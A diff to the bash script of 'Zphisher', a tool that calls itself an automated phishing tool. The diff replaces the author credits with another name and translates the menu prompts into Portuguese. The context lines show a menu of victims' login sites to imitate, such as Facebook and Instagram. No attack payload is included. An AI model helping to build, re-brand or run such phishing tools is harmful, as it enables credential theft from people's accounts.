@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	WHITE-HAT786
+##   Author 	: 	zumgabutm
 ##   Version 	: 	2.0
-##   Github 	: 	https://github.com/WHITE-HAT786
+##   Github 	: 	https://github.com/zumgabutm
 
 
 
@@ -79,7 +79,7 @@ banner() {
 		${ORANGE}      | |                                
 		${ORANGE}      |_|                ${RED}Version : 2.0
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by WHITE-HAT786${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by zumgabutm${WHITE}
 	EOF
 }
 
@@ -220,8 +220,8 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}WHIT-HAT786 ${RED}[ ${ORANGE}WHITE-HAT786 ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/WHITE-HAT786
+		${GREEN}Author   ${RED}:  ${ORANGE}WHIT-HAT786 ${RED}[ ${ORANGE}zumgabutm ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/zumgabutm
 		${GREEN}Version  ${RED}:  ${ORANGE}2.0
 
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
@@ -235,7 +235,7 @@ about() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Escolha uma opçao : ${BLUE}"
 
 	case $REPLY in 
 		99)
@@ -513,7 +513,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} ESCOLHA QUAL SERVIÇO DESEJA EXECUTAR ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -531,7 +531,7 @@ main_menu() {
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Escolha uma opçao : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
